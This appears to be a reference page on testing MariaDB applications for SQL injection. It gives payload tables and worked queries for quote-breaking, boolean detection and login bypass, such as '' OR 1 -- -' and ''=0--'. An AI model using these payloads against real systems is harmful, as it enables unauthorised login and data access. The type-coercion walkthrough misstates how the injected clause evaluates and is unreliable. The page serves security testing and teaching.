---
title: Testing Injection
description: Techniques for testing SQL injection vulnerabilities in MariaDB
category: Basics
order: 2
tags: ["testing", "basics", "injection"]
lastUpdated: 2025-12-18
---

When testing for SQL injection vulnerabilities in MariaDB databases, keep in mind:

- False means the query is invalid (MariaDB errors/missing content on website)
- True means the query is valid (content is displayed as usual)

## String-Based Injection

Given the query:

```sql
SELECT * FROM Table WHERE id = '1';
```

| Test Payload | Result | Description                          |
| ------------ | ------ | ------------------------------------ |
| `'`          | False  | Single quote breaks the syntax       |
| `''`         | True   | Two quotes balance each other        |
| `"`          | False  | Double quote breaks the syntax       |
| `""`         | True   | Two double quotes balance each other |
| `\`          | False  | Backslash breaks the syntax          |
| `\\`         | True   | Two backslashes balance each other   |

> **Note:** Backslash escaping depends on the `sql_mode` setting. When `NO_BACKSLASH_ESCAPES` is enabled, backslashes are treated as literal characters rather than escape sequences. Verify `@@sql_mode` before relying on these examples.

### Double Quotes as String Delimiters

MariaDB allows double quotes for string values (unlike strict ANSI SQL mode):

```sql
SELECT * FROM users WHERE id = "1"
```

### Quote Escaping

Quotes escape themselves inside strings:

```sql
SELECT 'it''s working' AS result
-- Returns: it's working
```

### Examples

```sql
SELECT * FROM Articles WHERE id = '1''';
```

```sql
SELECT 1 FROM dual WHERE 1 = '1'''''''''''''UNION SELECT '2';
```

### Notes

- You can use as many apostrophes and quotations as you want as long as they pair up
- It is also possible to continue the statement after the chain of quotes
- Quotes escape quotes (single quote escaped by another single quote)

## Numeric-Based Injection

Given the query:

```sql
SELECT * FROM Table WHERE id = 1;
```

> **Note:** Rows marked with `-` in the Result column test whether arithmetic expressions are evaluated rather than returning True/False. Compare the returned value against expected results to detect injection.

| Test Payload | Result | Description                                           |
| ------------ | ------ | ----------------------------------------------------- |
| `AND 1`      | True   | Logical truth maintains query validity                |
| `AND 0`      | False  | Logical false invalidates the query                   |
| `AND true`   | True   | Logical truth maintains query validity                |
| `AND false`  | False  | Logical false invalidates the query                   |
| `1-false`    | -      | Returns 1 if expression evaluated (false=0, so 1-0=1) |
| `1-true`     | -      | Returns 0 if expression evaluated (true=1, so 1-1=0)  |
| `1*56`       | -      | Returns 56 if expression evaluated, 1 if literal      |

### Boolean Values

In MariaDB, boolean values are integers:

```sql
SELECT true = 1 AS result   -- Returns: 1 (true)
SELECT false = 0 AS result  -- Returns: 1 (true)
```

### Arithmetic in WHERE Clause

```sql
SELECT * FROM Users WHERE id = 3-2;
-- Returns user with id = 1
```

### Notes

- `true` is equal to 1
- `false` is equal to 0
- Arithmetic expressions are evaluated before comparison

## Boolean-Based Detection

Testing if injection exists by comparing true and false conditions:

### AND 1=1 vs AND 1=2

```sql
-- True condition - returns results
SELECT * FROM users WHERE id = 1 AND 1=1

-- False condition - returns no results
SELECT * FROM users WHERE id = 1 AND 1=2
```

If the application behaves differently between these two queries, injection is confirmed.

### OR 1=1 Returns All Rows

```sql
SELECT * FROM users WHERE id = 999 OR 1=1
-- Returns all users regardless of the non-existent id
```

### String Comparisons

```sql
SELECT * FROM users WHERE '1'='1'  -- Returns all rows (true condition)
SELECT * FROM users WHERE '1'='2'  -- Returns no rows (false condition)
```

## Login Bypass Techniques

Given the query:

```sql
SELECT * FROM users WHERE username = '{input}' AND password = '{pass}';
```

| Test Payload      | Description                      |
| ----------------- | -------------------------------- |
| `' OR '1`         | Unclosed quote absorbed by query |
| `' OR 1 -- -`     | OR true with comment             |
| `" OR "" = "`     | Double quote variant             |
| `" OR 1 = 1 -- -` | Double quote with comment        |
| `'='`             | Empty string equals empty string |
| `'LIKE'`          | Empty LIKE empty is true         |
| `'=0--+`          | Type coercion bypass             |

### Unclosed Quote Injection

The final closing quote from the SQL query structure can absorb an unclosed quote:

```sql
-- Injection: ' OR '1'='1' --
-- Original query template: SELECT * FROM users WHERE username = '{input}' AND password = ''

-- After injection:
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = ''

-- Effective query (password clause is commented out):
SELECT * FROM users WHERE username = '' OR '1'='1'
-- Result: Returns all users since '1'='1' is always true
```

### Classic OR Injection in Password Field

Inject in the password field while using a valid username:

```sql
-- Username: admin
-- Password: ' OR '' = '
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '' = '';
-- The OR '' = '' is always true
```

### OR 1=1 with Comment

```sql
-- Injection: ' OR 1=1 --
-- Note: The -- comment requires a trailing space to work in MariaDB/MySQL.
-- Some references use "-- -" where the extra dash ensures the space is visible.

-- After injection:
SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = ''

-- Effective query (everything after -- is ignored):
SELECT * FROM users WHERE username = '' OR 1=1
-- Result: Returns all users; typically first user is admin
```

### Type Coercion Bypass

```sql
-- Injection: '=0--
-- Original: WHERE username = '{input}' AND password = ''

-- After injection:
SELECT * FROM users WHERE username = ''=0-- ' AND password = ''

-- Effective query (after -- comment removes the rest):
SELECT * FROM users WHERE username = ''=0

-- How it works:
-- 1. ''=0 compares empty string to 0
-- 2. In MariaDB, '' is coerced to 0 when compared to a number
-- 3. 0=0 evaluates to 1 (true)
-- 4. So the WHERE clause becomes: WHERE username = 1
-- 5. This returns any user where username coerces to 1 (or all if evaluated as boolean)
```

### Balanced Quote Injection

```sql
-- Injection: ' OR '1'='1' --
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = ''
```
